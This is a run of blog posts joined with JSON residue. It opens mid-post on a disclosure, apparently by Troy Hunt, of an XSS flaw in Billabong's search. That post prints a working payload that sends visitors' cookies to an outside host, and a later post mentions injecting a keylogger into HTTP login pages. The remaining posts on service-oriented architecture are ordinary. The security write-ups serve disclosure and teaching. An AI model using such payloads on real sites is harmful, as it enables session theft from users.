and add it to the blacklist. If untrusted data contains one of these bad patterns, you reject it.</li><li><strong>Whitelist:</strong>You describe everything you know is<em>good</em>, for example letters and numbers. The trick here is that you have to comprehensively come up with everything that you think might be legitimately provided by a user and allow it. If untrusted data is not entirely made up from patterns in the whitelist, you reject it.</li></ol><p>Whitelists are almost always preferable because they’re very explicit; only describing what you know to be good is a very discrete way of handling untrusted data. The problem with blacklists is that you don’t know what you don’t know. For example, you decide that double quotes are evil as they could be used to break out of an HTML attribute but later on realise that angle brackets could do the same thing in some browsers even though the HTML would be malformed. Or an entirely new attack vector raises its head.</p><p>Whitelists can be<em>very</em>simple, for example if you expect an integer or a GUID for an ID it’s very simple to typecast it and ensure it complies to that pattern. Likewise, a pattern such as a URL or an email address can be assessed against a regular expression rather than just accepting whatever the user provides. Things like people’s names are a little harder (many an Irishman has been rejected by sites that disallow single quotes), but there is much discussion and many examples of regexes that facilitate natural language characters and punctuation. Of course they also need to be conscious of things like non-Latin characters but again, this is an often held discussion with many examples of how to allow the good stuff while keeping out the bad stuff.</p><p>So let’s get back to Billabong and look at sanitisation. They follow a pretty tried and (kind of) trusted pattern of repeating the search term in the URL so that when you search for something like “shirt”, you see this:</p><p><img width=\"650\" height=\"400\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Search term reflected in page body\" src=\"http://lh6.ggpht.com/-dX-eaItsbvk/UaZiumJFu4I/AAAAAAAAFYw/fW6s0AG05F0/image15.png?imgmax=800\" border=\"0\"></p><p>However, search for something like “&lt;script&gt;” and you’ll get this:</p><p><img width=\"650\" height=\"198\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Search for&lt;script&gt; rejected by input sanitisation\" src=\"http://lh6.ggpht.com/-ktsqf97wKBY/UaZivY8OYVI/AAAAAAAAFY4/D3_dYJroc90/image18.png?imgmax=800\" border=\"0\"></p><p>Clearly there’s some sanitisation going on here, it’s just a question of whether it’s sufficient. If we modify that slightly we’ll see that if the leading angle bracket is dropped then the search goes through just fine:</p><p><img width=\"650\" height=\"320\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Search for script&gt; is allowed\" src=\"http://lh5.ggpht.com/-4s4wxEIS-zI/UaZiv5D_WSI/AAAAAAAAFZA/tUhk7Xcs0-s/image21.png?imgmax=800\" border=\"0\"></p><p>But hang on – why allow a greater than but not a less than? It’s starting to look like tag-blacklisting which per the definition above, is always going to be a bit dodgy. By process of elimination it’s easy to discover which characters are allowed through and beyond the obvious alphanumeric ones, they include<strong>:/\\’;”%.?</strong></p><p><img width=\"650\" height=\"320\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"A successful search for the characters :/\\’;”%.?\" src=\"http://lh6.ggpht.com/-cQ5ZuU2sDuM/UaZiwjAFipI/AAAAAAAAFZI/I7JWkkQUJ7I/image24.png?imgmax=800\" border=\"0\"></p><p>Some of those are punctuation which you might find in a product name someone would legitimately search for, but probably not characters like a double quote, a semicolon or a percent. Perhaps there are edge cases, but as we’re about to see, it’s the sort of thing you want to have a genuine need for before using.</p><h4>Output encoding contexts</h4><p>If you’re reading this, chances are you know what HTML markup looks like. For example, a paragraph tag is represented in markup as&lt;p&gt; (this is painfully obvious but bear with me). Thing is though, if you wanted to render that tag into the browser – just like I have here – then the actual markup is&lt;p&gt; where the angle brackets are represented by HTML escape characters. If they weren’t escaped then you’d literally end up with a paragraph tag in the markup and it wouldn’t be visible in the browser.</p><p>Let’s go back to Billabong and take a look at the lifecycle of the untrusted data that is the search term. Firstly, it’s actually only rendered into the source code in one location and that’s in JavaScript. When we searched for “shirt”, it ended up in this script block (see the second line):</p><pre class=\"code\"><span style=\"background: white; color: blue\">&lt;</span><span style=\"background: white; color: maroon\">script</span><span style=\"background: white; color: red\">type</span><span style=\"background: white; color: blue\">=\"text/javascript\"&gt;var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'shirt'</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">ProductSquareDefault =</span><span style=\"background: white; color: #a31515\">'/images/placeholder-{0}.jpg'</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">quantityMin = 1;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">showOutOfStock =</span><span style=\"background: white; color: blue\">false</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">showProductsWithImageOnly =</span><span style=\"background: white; color: blue\">true</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">discount =</span><span style=\"background: white; color: blue\">null</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">&lt;/</span><span style=\"background: white; color: maroon\">script</span><span style=\"background: white; color: blue\">&gt;</span></pre>It then got sent off to an API in the query string:<a title=\"https://au.shop.billabong.com/api/product/GetFiltersBySearchTerm?keyword=shirt&showSaleOnly=false\" href=\"https://au.shop.billabong.com/api/product/GetFiltersBySearchTerm?keyword=shirt&showSaleOnly=false\">https://au.shop.billabong.com/api/product/GetFiltersBySearchTerm?keyword=shirt&showSaleOnly=false<br></a><p>This API returns a JSON response with the results needed to build up the categories on the left under the search box (“Collections”, “Men”, “Women”, etc.) and then another API is called with the term in the query string again:<a href=\"https://au.shop.billabong.com/api/product/Search?filters=&keyword=shirt&showSaleOnly=false&buildLinks=true\">https://au.shop.billabong.com/api/product/Search?filters=&keyword=shirt&showSaleOnly=false&buildLinks=true</a></p><p>This then returns a<em>whopping</em>big JSON response of nearly 300kb (gzip, people!) with the individual results. All of this is orchestrated by a JavaScript file called<a href=\"https://au.shop.billabong.com/js/pages/search/search.js\">search.js</a>(minification, people!) which includes this piece of jQuery syntax:</p><pre class=\"code\"><span style=\"background: white; color: black\">$(</span><span style=\"background: white; color: #a31515\">'.search-form .searchkwd'</span><span style=\"background: white; color: black\">).val(keyword);</span></pre><p>The important thing in the context of output encoding is that this then sets the search term into the text box using the val() method in jQuery. This all happens in the DOM so there isn’t the same opportunity to exploit an XSS risk as if it was just reflected directly into the markup in the same way that we often see search features implemented. Yet there remains a risk…</p><p>Earlier we saw the word “shirt” appear in the JavaScript block which raises the question: is there any output encoding happening here? Let’s check by going back to one of the earlier searches which was for “script&gt;”. Here’s what we see:</p><pre class=\"code\"><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'script&gt;'</span><span style=\"background: white; color: black\">;</span></pre><p>This is where the problem begins because there’s no encoding happening. Earlier on we talked about a greater than sign encoding to&gt; in HTML, what you have to remember is that in JavaScript it’s a totally different syntax and what you need there is \\x3c or in other words, this is what the script<em>should</em>look like:</p><pre class=\"code\"><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'script\\x3c'</span><span style=\"background: white; color: black\">;</span></pre><p>That’s now enough to establish there’s an exploitable risk on the site, let’s look at how that might happen.</p><h4>Exploiting unsanitised data with unencoded output</h4><p>Remembering that the character<strong>:/\\’;”%.?</strong>are all allowed through the sanitisation and that it looks like they’ll happily be rendered as-is to the JavaScript context, the question now becomes “what can we do with this”? This a site that can be authenticated to and given that authenticated sessions on websites are almost always persisted by authentication cookies, let’s take a look at those. Of course there is a native browser defence against accessing cookies on the client side cookies and I wrote about it recently in<a href=\"http://www.troyhunt.com/2013/03/c-is-for-cookie-h-is-for-hacker.html\">C is for cookie, H is for hacker – understanding HTTP only and Secure cookies</a>.</p><p>That native defence is the HttpOnly cookie and when a cookie is flagged as such, it can’t be grabbed by JavaScript. However, here are Billabong’s cookies:</p><p><img width=\"688\" height=\"369\" title=\"image\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; margin: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"image\" src=\"http://lh5.ggpht.com/-LAFGSnIMJa0/UaZixGVC22I/AAAAAAAAFZQ/0rL3kL8vyew/image27.png?imgmax=800\" border=\"0\"></p><p>There is only one HttpOnly cookie and it’s the ASP.NET_SessionId which is HttpOnly by default. Given this is an ASP.NET app it’s also worth pointing out that were this site to be using the framework’s implementation of forms authentication we’d see a .ASPXAUTH cookie for persisting the authenticated session and it<em>would</em>be flagged as HttpOnly. Instead we see the highlighted CustomerSession cookie which is all that’s needed to steal the session – and it’s not HttpOnly. This is<em>precisely</em>why you’ll often hear people (myself included) say how it important it is to use existing, proven security implementations.</p><p>So that tells us enough to know that there’s something useful to be gained by grabbing cookies. Get that from a logged in user and you can become them. Let’s try this URL:<a title=\"https://au.shop.billabong.com/search?keyword=\\';location.href=\"http://hackyourself.troyhunt.com/Cookies/?c=\"%2BencodeURIComponent(document.cookie);//\" href=\"https://au.shop.billabong.com/search?keyword=\\';location.href=\"http://hackyourself.troyhunt.com/Cookies/?c=\"%2BencodeURIComponent(document.cookie);//\">https://au.shop.billabong.com/search?keyword=\\';location.href=\"http://hackyourself.troyhunt.com/Cookies/?c=\"%2BencodeURIComponent(document.cookie);//</a></p><p>You may be able to guess what’s in there but it makes a lot more sense when you see it rendered – without any output encoding – to the source of the page:</p><pre class=\"code\"><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'\\''</span><span style=\"background: white; color: black\">; location.href =</span><span style=\"background: white; color: #a31515\">\"http://hackyourself.troyhunt.com/Cookies/?c=\"</span><span style=\"background: white; color: black\">+ encodeURIComponent(document.cookie);</span><span style=\"background: white; color: green\">//';</span></pre><p>Make sense now? It breaks down into three parts:</p><ol><li>Close off the keyword variable assignment and terminate the statement.</li><li>Redirect the browser to my website along with all the URL encoded cookies that the browser can access (anything not flagged as HttpOnly).</li><li>Comment out the remaining statement (this is the characters normally used to close off the keyword string and terminate the statement).</li></ol><p>As a result of this, I now have your cookies and that includes your session ID:</p><p><img width=\"866\" height=\"534\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Stealing Billabong cookies\" src=\"http://lh4.ggpht.com/-QFj9UGnEAXI/UaZix9ZiQzI/AAAAAAAAFZY/D7g_pzhNElA/image31.png?imgmax=800\" border=\"0\"></p><p>Of course I (or an attacker) need to be able to get a victim to follow a link with the XSS payload in it<em>and</em>make sure it’s a victim that’s actually logged into Billabong at the time, but that’s precisely why we have all the defences discussed above.</p><h4>Somebody didn’t hack themselves first…</h4><p>This is precisely the sort of thing I was talking about the other day when I wrote<a href=\"http://www.troyhunt.com/2013/05/hack-yourself-first-how-to-go-on.html\">Hack yourself first – how to go on the offence before online attackers do</a>. Here we have three ridiculously simple risks that anyone can identify remotely (and someone obviously did):</p><ol><li>Insufficient untrusted data sanitisation</li><li>No output encoding whatsoever</li><li>Auth cookie not flagged as HttpOnly</li></ol><p>This is a really good example of how multiple independent risks can be chained together to create a single exploit. It also illustrates why each of those risks, whilst they might seem small and insignificant in isolation, are actually extremely important. Of course it’s entirely possible the developers weren’t aware of these and didn’t know what to look for in the first place, indeed that’s why I wrote the aforementioned post on hacking yourself and will be talking much, much more about this in the future. I thought this was a great example why.</p><h4>Disclosure</h4><p>This week I wrote about<a href=\"http://www.troyhunt.com/2013/05/the-responsibility-of-public-disclosure.html\">The responsibility of public disclosure</a>and the very disappointing responses I often have when doing my darndest to privately reach out to the owners of at-risk websites. Conversely, disclosures that went public straight away and got press resulted in very swift action and benefited those at risk and those who could do well to learn from the experience (namely other developers). I then laid out what IMHO are very practical, sensible guidelines I follow when writing about any risk.</p><p>In this case, it’s hardly a smoking gun and not something you can go out and do immediate damage with, it’s certainly not a Black and Decker case where there are public logs with user credentials in them. I reached out to Billabong via twitter (yes, it’s a manned account) three times, firstly<a href=\"https://twitter.com/troyhunt/status/338437306077810688\">on Sunday</a>and got no response then<a href=\"https://twitter.com/troyhunt/status/339148328078024705\">on Tuesday</a>then again<a href=\"https://twitter.com/troyhunt/status/339536663380381696\">on Wednesday</a>. No response. Zip. Nada. Again.</p><p>Disclosure is indeed hard.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/93WStnpJ4b0\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1228}}

OWASP is very specific about this in<a href=\"http://www.troyhunt.com/2011/11/owasp-top-10-for-net-developers-part-9.html\">part 9 of their Top 10 web application security risks</a>and summarise it well in the<a href=\"https://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet\">transport layer protection cheat sheet</a>:</p><blockquote><p>The initial login page, referred to as the \"login landing page\", must be served over TLS. Failure to utilize TLS for the login landing page allows an attacker to modify the login form action, causing the user's credentials to be posted to an arbitrary location.</p></blockquote><p>It’s not just Woolworths doing this, in fact it’s extremely common and you’ll see it on<a href=\"http://www.godaddy.com/\">GoDaddy</a>:</p><p><img width=\"742\" height=\"412\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"GoDaddy login page loaded over HTTP\" src=\"http://lh5.ggpht.com/-R3oO1habrgc/UZoNCGOyApI/AAAAAAAAFVk/f_oRmxXp2HE/image5.png?imgmax=800\" border=\"0\"></p><p>On<a href=\"http://www.pandora.com/\">Pandora</a>:</p><p><img width=\"742\" height=\"412\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Pandora login page loaded over HTTP\" src=\"http://lh6.ggpht.com/-j0-9eUp6Duo/UZoNC8NU1JI/AAAAAAAAFVs/htmQtMnpu04/image8.png?imgmax=800\" border=\"0\"></p><p>And even on the<a href=\"http://www.ft.com/\">Financial Times</a>:</p><p><img width=\"741\" height=\"413\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Financial Times login page loaded over HTTP\" src=\"http://lh5.ggpht.com/-XB1UNVWqNSA/UZoNDirIWgI/AAAAAAAAFV0/xi0Lb_lkJSE/image61.png?imgmax=800\" border=\"0\"></p><p>I’m calling out these simply because they’re high-profile sites yet they all load the login forms over HTTP and post to HTTPS. Why aren’t they implementing SSL correctly? Most likely convenience; customers can login direct from the homepage and they can have it delivered over HTTP. Mind you Pandora links off to a login page so why they couldn’t just serve that securely to begin with is a bit of a mystery.</p><p>So how should it be done? Load the login form over HTTPS, either by linking to a dedicated login page or popping it up in a separate window (although there’s a UX argument against this). Even better, just load the whole site over HTTPS! Yes, there are some barriers to HTTPS across the board (managing certs in web farms, dependencies on assets from third parties, impact on CDNs, etc) but it sure solves the login form issue. Check out<a href=\"http://www.netflix.com\">Netflix’s approach</a>– straight into HTTPS, job done!</p><p>The other issue with the examples above is that potential manipulation of the content aside, missing HTTPS on the login form leads to exactly the discussion this post opened with – users not believing their credentials are protected. All the messaging we’ve been delivering to website users since the early days of the web about checking for the padlock in the browser address bar goes down the drain because it’s simply not there! There’s no assurance that their credentials will be protected and it’s a real shame to dilute such an important security message.</p><p>As for how the exploit in the video works, it’s just a simple<a href=\"http://fiddler2.com/documentation/KnowledgeBase/FiddlerScript/ModifyRequestOrResponse\">Fiddler script</a>to inject the keylogger before the body tag closes off. The keylogger itself is<a href=\"https://code.google.com/p/javascript-keylogger/\">over on Google Code</a>, the only code I wrote to incorporate it was the script tags you saw at the end of the video and the “Hack Yourself” website which receives the logged keys. It really is that simple.</p><p>Whilst Fiddler is good for demonstration purposes, clearly an actual weaponised attack would work differently but the principle is the same: When unencrypted traffic passes through a node on the network – NIC, ethernet cable, router, proxy, ISP, etc. – it may be observed or manipulated by an attacker. This isn’t theoretical, there are many precedents such as<a href=\"http://www.thetechherald.com/articles/Tunisian-government-harvesting-usernames-and-passwords/12429/\">the Tunisian government harvesting Facebook credentials en mass</a>.</p><p>This is all a bit odd really, I mean these sites have gone to the effort of implementing<em>some</em>SSL but then blown it by loading those login forms over HTTP. As we saw with Woolworths, posting over a secure connection is completely useless if there’s no integrity in the login form itself, an attacker may already have the credentials by then if the connection is compromised which is the very risk they all implemented SSL to protect from in the first place!</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/2MOCxoW2JyE\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1229}}

In this post, we're going to dig a bit deeper into the elements that make up a service.  These elements are illustrated below.<br /><br /><a href=\"http://2.bp.blogspot.com/_Ulehi1qz3j0/SPyoyjgJgxI/AAAAAAAAAEU/0svYzvvNtIU/s1600-h/Service+Elements.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://2.bp.blogspot.com/_Ulehi1qz3j0/SPyoyjgJgxI/AAAAAAAAAEU/0svYzvvNtIU/s400/Service+Elements.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5259264051338904338\" /></a><br />Note that the illustration above doesn't imply any kind of layering.  There are three types of service elements depicted.  The yellow elements are related to the service domain.  This is the logic, information model and state that drives the behaviour of the service relative to the responsibilities it holds in the overall architecture.<br /><br />The green elements relate to the service boundary.  The service contract describes the messages managed by the service and the endpoints through which the messages are exchanged.<br /><br />The blue elements are service resources.  Note that the service contains human resources.  This is because service logic may in part be executed by people.  This is explained in more detail<a href=\"http://bill-poole.blogspot.com/2008/03/are-there-people-in-my-service.html\">here</a>.  This is a very important point.  Most discussions around SOA tend to describe services only as IT constructs.  A service consumer is unaware and does not care whether the service functionality is provided by people at a keyboard or software running on a server.<br /><br />In addition to the human resources, a service also will very likely contain software and hardware infrastructure.  The hardware infrastructure refers to the physical hardware on which the service operates - e.g. servers, SANs and communication infrastructure.<br /><br />The software infrastructure refers to software that supports the operation of the service, but doesn't implement the logic defined within the service domain.  So for example, this software would include operating systems, application platforms and communication software.<br /><br />The distinction between software infrastructure and service domain logic is an important one.  Software infrastructure can be reused between services, whereas logic related to the service domain should not be.  Domain logic should be implemented and deployed only once in one service.  Why?  Because otherwise we have low cohesion - a single concern addressed by multiple services - and that leads to coupling between services.<br /><br />So why can we reuse software infrastructure between services?  This is because such software is generic.  It doesn't pertain to any specific service domain.  Take UI rendering logic for instance.  The logic required for rendering a window doesn't relate to any specific domain addressed by any service in your business.<br /><br />Other examples of software infrastructure include rules engines and workflow systems.  However the rules and workflows themselves<i>would</i>constitute service domain logic.<br /><br />An interesting example is a CRM package.  A CRM package comes with quite a lot of what would seem to be domain logic.  For example, a CRM may be deployed in support of the Sales function of a business without a great deal of customisation.  Here, a large number of the native application features will directly contribute to the service domain.<br /><br />A CRM package does not however need to deal only with customers.  Most CRM packages can be highly customised to hold custom entities with complex relationships.  Custom logic can be added to the CRM package to implement specific business rules around these entities.  In this case the CRM package is being leveraged as an application platform, and as such is not implementing the domain logic of the service.<br /><br />Okay last but not least, we need to discuss the service information model and state.  Pretty much every service will have state.  That state will conform to the service information model and the service domain logic executes against that information model.  To that end, the service information model, state and domain logic are all indelibly linked.<br /><br />Note that any state leveraged by the software infrastructure is considered part of the infrastructure itself and not part of the service state in the above illustration.<br /><br />Just like service domain logic, the service state and information model should not be shared between services as it introduces coupling.  Services should share data only by way of message exchange, although this is not always possible when transforming an enterprise full of legacy applications to an SOA - at least initially; but more on that in a future post.<br /><br />So everything in blue in the above illustration is reusable between services.  The same people can participate in many services, and the same software and hardware infrastructure is reusable between services.  Everything else should not be directly reused as it introduces coupling and reduces cohesion.  Of course, domain logic within one service can be reused by other services through exchanging messages with that service.<br /><br />Okay well that sums up the basic elements of a service.

So I thought it appropriate to begin a series of blog posts on the anatomy of a service.<br /><br />So let us begin by restating the definition of a service.  A service (in the context of SOA) is an autonomous coarse grained unit of logic that exposes functionality by way of exchanging messages conforming to its service contract with service consumers via its endpoints.<br /><br />The service contract describes the syntax (not semantics) of messages exchanged via each service endpoint, as well as the means by which messages are carried between each endpoint and service consumers.  Each endpoint is located and uniquely identified by its address.<br /><br />A service provider may also consume other services, and a service consumer may in fact also be a service provider.  As such, the terms<i>service provider</i>and<i>service consumer</i>describe roles in a specific interaction.  The rules governing communication with a service are described by its policy.<br /><br />What do we mean when we say a service is autonomous?  Well we mean a few things actually.  Firstly, services are in control of their own state.  Services are not<i>instantiated</i>by their consumers.  A service exists as a single autonomous entity.<br /><br />Secondly, we mean that services may be under different ownership domains.  Those parties responsible for the service and its management may very likely be different to those responsible for other services.  Services may be versioned and deployed independently of each other.<br /><br />And thirdly, we mean that services should not be dependent upon the availability of other services in order to function without failure - even if that is in some limited capacity.<br /><br />I'd also like to point out that there is the view that a service contract should<i>not</i>be devoid of semantic definition.  There is the thinking that a service contract should also describe the semantics of the messages exchanged by the service, as well as the state the expected behaviour of the service.<br /><br />Okay so now we've defined a service, what does a service look like?  Well that's the beauty of SOA - because service implementations are encapsulated within their service boundaries, consumers don't (or shouldn't anyway) have any visibility or knowledge of the service provider's implementation.<br /><br />But that doesn't really help us much as architects that need to design these things.  That's the reason for this series of blog posts.  We as architects need to understand the different ways to go about designing services - not just their boundaries and responsibilities, but their implementations as well.<br /><br />Over the next few posts I intend to go through various different flavours of service anatomy in order to bring some clarity to the various options that exist for implementing services.

Often, the same program runs on different nodes, but takes on different roles on each node.  The role each program instance takes on each node can be determined by a unique rank assigned by the MPI environment to each MPI process.<br /><br />Messages can then be passed between different processes to coordinate their activities.  Often the program detects if it is rank zero and if so takes on the \"root\" responsibility, handing data and control messages to the other nodes, coordinating their activities and aggregating their results.<br /><br />The message exchange patterns offered by MPI.NET are<i>point-to-point</i>,<i>all-to-one</i>(gathering data),<i>one-to-all</i>(broadcast) and<i>all-to-all</i>.  These message exchange patterns differ from the message exchange pattern inherent to EDA, publish-subscribe.<br /><br />With publish-subscribe, systems subscribe to specific topics or topic specifications.  Messages published onto a given topic are routed to all subscribers that have subscribed to a matching topic specification.  Alternatively, subscriptions may be defined based on message content-based rules.<br /><br />With MPI.NET, there are no subscriptions as such.  Messages may be<i>broadcasted</i>to every node, which then decides whether the message is relevant.  This is a subtle difference, and perhaps one might argue it represents a highly simplified form of EDA.<br /><br />With regards to SOA, it is extremely bad practice for services to share the same business rules or data representation as it couples services too tightly.  The fundamental principle of MPI.NET is that the same logic can/will run on multiple nodes.  The purpose is quite different from SOA.<br /><br />With MPI.NET, you are distributing execution of the same logic across multiple servers for the purpose of increasing performance.  With SOA each service is responsible for its own logic, encapsulated behind its service boundary.<br /><br />Furthermore, the number of nodes allocated in an MPI.NET application is dynamic by design.  With SOA, each service has specific rules and responsibilities.  The number of services cannot be dynamically increased or decreased.<br /><br />Certainly<i>within</i>a service the number of nodes allocated to handle messages could be dynamically adjusted based on load.  However, these nodes are not directly addressable.  They are not visible to the consumers of the service.<br /><br />Another difference is that MPI.NET nodes do not have the concept of endpoints.  One cannot deliver messages to an MPI.NET node across a variety of different bindings via different endpoints.<br /><br />MPI.NET should be seen as a way to implementing a single service internally across multiple machines for the purpose of improving performance.<br /><br />I would say therefore that MPI.NET is not a platform for implementing SOA.  It could be considered as supporting the EDA style of architecture, but only in a very simplistic sense.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/inAj9YuVHoA\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1249}}

The problem is that more often than not no explanation is given for what business agility actually<i>is</i>, why it is important, or how SOA contributes to achieving it.<br /><br />Firstly, it is important to note that business agility is a relative goal as opposed to an absolute one.  Even the most agile business can strive for greater agility.<br /><br />So what is business agility?  Business agility is the degree to which an organisation can effectively innovate and respond to market forces.<br /><br />In any given undertaking within an organisation, there are the traditional project management constraints of time, resource, scope and quality.  For a fixed scope if we wish to decrease time to delivery, we must increase resource or decrease quality.  For fixed resource if we wish to decrease time to delivery, we must decrease scope or quality.<br /><br />Note that scope refers to the amount of work that needs to be done to deliver the agreed outcome.  But as always, there is more than one way to skin a cat.  The business objectives targeted by the project can be met in any number of different ways.  A talented Solution Architect can design a solution to a business problem that requires less work to deliver.<br /><br />Really what we are talking about here is contrasting<i>business value</i>with<i>effort</i>.  If an organisation has a highly complex IT architecture that is very tightly coupled with a large number of interdependencies, then a change will take more<i>effort</i>to achieve, but deliver the same<i>business value</i>.<br /><br />In order to have an agile organisation, we must have the ability to enact change with less effort.  SOA helps simplify the IT architecture of an organisation by making systems more loosely coupled.  Of course, there are varying degrees of loose coupling with different SOA implementations.<br /><br />The SOA architectural style reduces coupling through message based interactions conforming to explicitly defined service contracts that encapsulate the implementation details of services away from consumers.  This gives us the ability to make changes to service implementations without impacting their consumers.<br /><br />We reduce coupling further by designing our services with appropriate<a href=\"http://bill-poole.blogspot.com/2008/04/service-granularity.html\">granularity and cohesion</a>, based on publish-subscribe messaging with<a href=\"http://bill-poole.blogspot.com/2008/07/service-contract-stability.html\">stable service contracts</a>.<br /><br />The IT architecture of an organisation however is only one piece of the business agility puzzle.  Once a business need has been identified, the business requirements must be extracted.  The speed, efficiency and accuracy with which this activity is performed also contribute to business agility.  There is very little business value in delivering a solution that doesn't meet the identified business objectives.<br /><br />Furthermore once we have extracted our business requirements, assuming they are accurate, we need to produce a solution architecture that meets those requirements.  So an organisation's proficiency in Solution Architecture is also significant here.<br /><br />We also want to ensure that as each solution is delivered, the complexity of the business and IT architecture is not adversely affected.  As such, we need the proper architecture governance processes in place to protect the broader enterprise architecture.<br /><br />It is important to strike the right balance with governance however.  Inefficient governance processes slow the rate at which projects can be delivered, thus harming business agility.  Insufficient governance however will result in the gradual increase of architectural complexity, thus harming business agility in the long run.<br /><br />Simply developing an effective solution architecture is still not enough.  We must of course then go about implementing the solution.  Here, the effectiveness of the organisation's project and programme management function is relevant, as well as the proficiency of the people that build and deploy the solution.<br /><br />And finally once the solution is ready to deploy, there must be effective change management processes in place to ensure that affected workers are properly trained and informed to support the change.  If the solution is not embraced by the people it affects, then the change will be ineffective.<br /><br />So why all the fuss about business agility?  Simply put, an organisation that doesn't respond to its changing environment will eventually become uncompetitive.  Granted that some industries are more volatile than others, however all business environments change over time.  Those businesses that are able to embrace this change in order to generate competitive advantage will be more successful.<br /><br />Innovation is also a key consideration in generating competitive advantage.  The ability to be able to take an idea and turn it into reality in less time, with less cost and lower risk certainly generates competitive advantage.<br /><br />So in conclusion, SOA as a style of architecture<i>contributes</i>towards business agility through reduction of enterprise architectural complexity, but by no means guarantees it.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/NTVjotOGZA8\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1250}}

Are they in fact separate architectural styles?  Are they separate concerns?  Do they complement each other?  Does SOA subsume EDA?<br /><br />SOA and EDA are in fact separate architectural styles.  However they describe different concerns of an architecture.  They each bring their own benefits.  As such, it is possible (and in fact good practice) for the two styles to overlap.  An architecture can indeed both be service oriented<i>and</i>event driven.  Likewise it is possible for an architecture to be service oriented but not event driven, or event driven and not service oriented.  This is illustrated below.<br /><br /><a href=\"http://4.bp.blogspot.com/_Ulehi1qz3j0/SNyjOO41YjI/AAAAAAAAAEM/lt-cYi_G-6k/s1600-h/SOA+and+EDA.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://4.bp.blogspot.com/_Ulehi1qz3j0/SNyjOO41YjI/AAAAAAAAAEM/lt-cYi_G-6k/s400/SOA+and+EDA.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5250250730517127730\" /></a><br />An architecture consisting of services with no endpoints with a publish-subscribe binding conforms to the service oriented style of architecture, but is not event driven.  An architecture consisting of messages published over topics, but where there is no notion of services is event driven, but not service oriented.  For example, EAI can be achieved by having a number of applications publishing and subscribing over a set of topics, without explicitly defining any services, endpoints or service contracts.<br /><br />Where SOA and EDA come together, a topic corresponds to a specific endpoint of a specific service.  A topic cannot be shared between endpoints or services, and messages published onto a topic must conform to an explicitly defined service contract.  SOA brings benefits to EDA and vice versa.  Therefore we get the best result when the two architectural styles are combined.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/l7DD_fs6EkA\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1251}}

Miguel posted a good<a href=\"https://www.blogger.com/comment.g?blogID=4338956765494283322&postID=2153814277876223807\">question</a>about whether composition in SOA is analogous with composition in Component Oriented Programming.  This really got me to thinking about whether composition actually has any real meaning in SOA at all.<br /><br />One of the key differences between components in Component Oriented Programming and services in SOA is that components must be<i>instantiated</i>.  A client must instantiate a component before the component is used.  Furthermore, multiple instances of a component can and usually do exist at the same time.<br /><br />Composition makes a lot of sense in Component Oriented Programming because we have one or more child components supporting a parent component.  Every new instance of the parent component contains new instances of the child components.<br /><br />Without instancing, composition wouldn't really make a great deal of sense in Component Oriented Programming.  Just because a component uses or references another component, doesn't make those components a composite.  What makes a set of components a composite is the lifetime of the child components being indelibly tied to that of the parent component.  The children are created with the parent and destroyed when the parent is destroyed.  The children have no purpose other than to meet the needs of the parent.<br /><br />SOA is a different ballgame however.  There is only ever one and only one instance of every service.  